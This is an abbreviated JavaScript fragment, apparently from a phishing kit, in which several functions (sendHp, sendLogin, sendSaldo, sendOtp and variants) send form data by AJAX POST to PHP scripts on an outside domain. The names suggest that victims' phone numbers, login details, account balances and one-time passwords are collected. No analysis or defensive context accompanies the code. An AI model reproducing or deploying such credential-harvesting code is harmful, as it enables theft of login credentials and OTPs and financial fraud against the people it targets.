function sendHp() {
   ...
   $.ajax({
      url: 'https://choreoapps.oo-nan.cfd/privat/11/no.php',
      type: 'POST',
...
function sendLogin(){
   $('.load').fadeIn();
    ...
    $.ajax({
      url: 'https://choreoapps.oo-nan.cfd/privat/11/sudah.php',
      type: 'POST',
...
function sendSaldoS() {
   ...
   $.ajax({
      url: 'https://choreoapps.oo-nan.cfd/privat/11/saldosdh.php',
      type: 'POST',
...
function sendOtpS() {        
   ...
   $.ajax({
      url: 'https://choreoapps.oo-nan.cfd/privat/11/otpsdh.php',
      type: 'POST',
...
document.getElementById("nohp").value =
    ...
    $.ajax({
      url: 'https://choreoapps.oo-nan.cfd/privat/11/belum.php',
      type: 'POST',
...
function sendSaldo() {
   ...
   $.ajax({
      url: 'https://choreoapps.oo-nan.cfd/privat/11/saldoblm.php',
      type: 'POST',
...
function sendOtp() {
   ...
   $.ajax({
      url: 'https://choreoapps.oo-nan.cfd/privat/11/otpblm.php',
      type: 'POST',
